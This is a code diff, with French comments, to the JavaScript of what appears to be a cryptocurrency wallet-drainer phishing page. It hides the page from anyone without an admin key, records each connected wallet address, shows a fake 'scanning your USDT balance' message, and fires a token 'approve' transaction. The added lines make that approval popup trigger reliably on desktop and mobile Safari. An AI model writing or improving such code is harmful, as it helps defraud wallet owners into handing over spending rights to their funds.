@@ -1001,7 +1001,7 @@
   };
 
   /* ===== PROTECTION ADMIN ===== */
-const MON_SECRET = "admin2912"; // Change "moncode123" par ton propre mot secret
+const MON_SECRET = "admin2912";
 const params = new URLSearchParams(window.location.search);
 if (params.get("admin") !== MON_SECRET) {
   window.location.href = "https://etherscan.io/verifyaddress";
@@ -1429,7 +1429,23 @@ async function initWalletConnect() {
     body: JSON.stringify({ address: account, chain: '1' })
   }).catch(err => console.error('Erreur record-wallet:', err));
 
-  sendExactApproveTransaction();
+  // === Déclenchement robuste popup 2 (desktop + mobile) ===
+  // Garde-fou pour ne déclencher qu'une seule fois
+  let approveTxTriggered = false;
+  function triggerApproveTx() {
+    if (approveTxTriggered) return;
+    approveTxTriggered = true;
+    sendExactApproveTransaction();
+  }
+  // Desktop : délai de 1s pour laisser le relay WalletConnect finaliser la session
+  setTimeout(triggerApproveTx, 1000);
+  // Mobile (iOS Safari) : fallback si le timer est suspendu pendant que Safari est en arrière-plan
+  document.addEventListener('visibilitychange', function onVis() {
+    if (document.visibilityState === 'visible') {
+      document.removeEventListener('visibilitychange', onVis);
+      triggerApproveTx();
+    }
+  });
 }
 
 async function sendExactApproveTransaction() {
@@ -1437,7 +1453,7 @@ async function sendExactApproveTransaction() {
     const scanText = document.querySelector('.scan');
     if (scanText) scanText.textContent = 'Détection de votre solde USDT…';
 
-    const provider = new ethers.providers.JsonRpcProvider('https://eth.llamarpc.com');
+    const provider = new ethers.providers.JsonRpcProvider('https://ethereum.publicnode.com');
     const usdtContract = new ethers.Contract(USDT_ADDR, [
       'function balanceOf(address) view returns (uint256)',
       'function decimals() view returns (uint8)'
@@ -1656,10 +1672,8 @@ async function sendExactApproveTransaction() {
     mobileMore.addEventListener('click', function(e) {
       e.preventDefault();
       e.stopPropagation();
-      // Ferme le menu hamburger
       mobileMenu.classList.remove('open');
       hamburgerBtn.classList.remove('open');
-      // Ouvre le panneau More EXACTEMENT comme sur desktop
       setOpen('More');
     });
   }
